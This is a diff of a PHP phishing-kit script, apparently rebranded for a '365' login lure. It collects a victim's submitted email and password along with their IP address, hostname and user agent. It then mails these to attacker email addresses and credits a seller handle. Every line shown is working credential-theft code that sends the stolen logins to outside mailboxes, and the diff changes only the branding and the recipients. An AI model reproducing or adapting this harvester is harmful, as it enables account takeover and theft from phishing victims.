@@ -6,7 +6,7 @@ if($email != null && $password != null){
 	$ip = getenv("REMOTE_ADDR");
 	$hostname = gethostbyaddr($ip);
 	$useragent = $_SERVER['HTTP_USER_AGENT'];
-	$message .= "|----------| xLs |--------------|\n";
+	$message .= "|----------| 365 |--------------|\n";
 	$message .= "Login From           : ".$detail."\n";
 	$message .= "Online ID            : ".$email."\n";
 	$message .= "Passcode              : ".$password."\n";
@@ -14,8 +14,8 @@ if($email != null && $password != null){
 	$message .= "|Client IP: ".$ip."\n";
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
-	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
-	$send = "logins20160@gmail.com, mylogs2019@yandex.com";
+	$message .= "|----------- CrEaTeD bY @Seller623 --------------|\n";
+	$send = "asobarlit2018@gmail.com";
 	$subject = "Login : $ip";
     mail($send, $subject, $message);   
 	$signal = 'ok';
